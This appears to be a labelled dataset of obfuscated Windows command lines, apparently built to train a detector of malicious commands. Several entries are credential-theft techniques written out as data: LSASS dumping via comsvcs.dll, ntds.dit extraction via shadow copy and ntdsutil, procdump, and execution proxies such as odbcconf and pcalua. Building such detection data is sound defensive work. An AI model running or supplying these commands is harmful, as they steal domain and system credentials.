"Command","Label"
"dEL""C:\uSerS\FEISey.LOg""/F	/q","0"
"fsutil.exefilelayout		""D:\ProgramFiles\Users\pmqclhoxx.dat""","0"
"CSi.exe	{pATH:.cS}","1"
"%WINDIR%\NTDS\ntds.dit' to
'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
opy1\Windows\NTDS\ntds.dit'","1"
"attrib.exe+h		""D:\Users\Logs\pbqalhsp.txt""","0"
"priNTbrM	-b-D{path_smb:FOLDEr}-f{pATh_aBsoLUTe:.ZIp}","1"
"scHtasks /cReaTE /Tn ""mY daiLY BacKuP"" ""/tR"" ""cOpY ""\""d:\winDOWS\Logs\IxOExY.dAt\"""" \""c:\apPdAta\teMp\KIbNbOFAub.exe\"""" /Sc ""dAIly"" /ST 23:00","0"
"net.exe	userjcmjdlxq	/add","0"
"COPY	""c:\uSers\wINDOwS\gcagIQtkh.log""""c:\AppdatA\OqivDtzveL.exe""","0"
"FSUTiL filE ""LaYout"" ""d:\windows\pROGrAm filES\yMkuQ.dat""","0"
"CmD.exe"" /C wMIC.exe PROcesS CAlL crEatE ""Cmd.exe /c MkDIr C:\WINDoWS\temP\mcAFee_LOGS & NtDSUTIL.exe \""ac I nTDS\"" iFM \""CreatE Full C:\WINDoWS\tEMP\mCAfee_LOgs\","1"
"RMdir.exe""d:\ProGrAmFiLeS\prOGraMfIles""	/S	/Q","0"
"xCopy.exe	.\TOc*.ymL	..\..\COPy-to\/s/y
reMOuTpuTExAmPLe.
reM.\D1\toc.YML
rEm.\d1\D12\Toc.ymL
ReM.\d2\Toc.YML
ReM3fILE(s)cOPiED","0"
"pr\u006Fcdump.exe -md {PATH:.dll} foobar","1"
"""odbcconf"" ""/a"" {REGSVR {PATH_ABSOLUTE:.dll}}","1"
"pOWeRShelL -cOMmAnd ""gEt-cHiLDitEm -PAtH d:\wINDoWS\lOGS -reCurSe | SELECT-object FullnAmE, LEnGtH""","0"
"xcopy.exe \customer ""h:\public\address"" /s /e ""/k"" /p /i","0"
"atTRiB +H ""C:\APpdAtA\LOGs\kbuLk.dll""","0"
"rundll32 c:\windows\syst\u0065m32\comsvcs.dll minidump {ls""+""ass_pid} dump.bin full","1"
"volumec:	AliASSYsTEm1	GuId\\?\VoLume{XXxXXxxX-xxxX-xxxx-XXxx-XxXxxXxxxxXx}\","0"
"RUnExehELPer%pAtHEXT:~0,4% {pATh_abSOLUtE:.exe}","1"
"ping 192.168.100.48","0"
"GPscriPT /lOG\u006Fn","1"
"TFtP.exe  ""-I"" HosT1 GeT ""bOOT.IMG""","0"
"""attrib.exe"" ""+h"" ""D:\Users\Logs\pbqalhsp.txt""","0"
"tAsKlisT.exe /V","0"
"pcalua%PATHEXT:~0,4%	-a	{PATH:.exe}","1"
"eventcreate.exe /s server /u user /id 100 /t WARNING ""/d"" ""Remote ""machine"" ""with"" partial user credentials""","0"
"lbpolicy set ""lun"" type=^^<type^^> ""[paths=^^<path^^>-{primary"" ^^| ""^^<weight^^>}[,^^<path^^>-{primary"" ^^| ^^<weight^^>}[,…]]]","0"
